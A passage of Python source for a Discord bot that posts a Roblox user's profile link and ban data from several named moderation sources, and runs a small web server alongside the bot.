		embed.add_field(name="Profile Link", value=f"[{user}](https://www.roblox.com/users/{userId}/profile)", inline=False)
		embed.add_field(name="Nova - Ban Data", value=nova, inline=False)
		embed.add_field(name="aparam - Ban Data", value=aparam, inline=False)
		embed.add_field(name="Karma - Ban Data", value=karma, inline=False)
		embed.add_field(name="112 - Ban Data", value=oneonetwo, inline=False)
		embed.add_field(name="Sleepcore - Ban Data", value=sleepcore, inline=False)

		embed.timestamp = discord.utils.utcnow()
		embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
		await ctx.send(embed=embed)
	except Exception as err:
		embed = discord.Embed(
			color = discord.Color.red(),
			title = "Error",
			description = "An unexpected error has occured."
		)

		embed.add_field(name="Details", value=str(err), inline=False)

		embed.timestamp = discord.utils.utcnow()
		embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
		await ctx.send(embed=embed)

def main1():
	"""Web server"""
	app.run(host="0.0.0.0", port = 5000)

def main2():
	"""Discord Bot"""
	bot.run(token)

if __name__ == "__main__":
	webserver = threading.Thread(target = main1, daemon=False)
	# bot = threading.Thread(target = main2, daemon=True)
	
	webserver.start()

	bot.run(token)
	
	webserver.join()
	# bot.join()
